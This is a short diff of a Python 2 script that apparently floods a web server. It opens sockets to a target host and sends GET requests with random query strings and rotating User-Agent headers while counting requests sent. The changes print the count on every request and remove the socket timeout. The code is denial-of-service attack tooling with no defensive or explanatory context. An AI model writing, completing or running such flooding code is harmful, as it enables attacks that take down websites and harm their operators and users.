@@ -348,13 +348,11 @@ i=0
 def k():
  global i
  i+=1
- if i%100==0:
-  print'requests sent:', i
+ print'requests sent:', i
 
 def so():
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.settimeout(3)
   s.connect((u,p))
   s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
   s.send("User-Agent: {}\r\n".format(random.choice(ua)).encode("utf-8"))
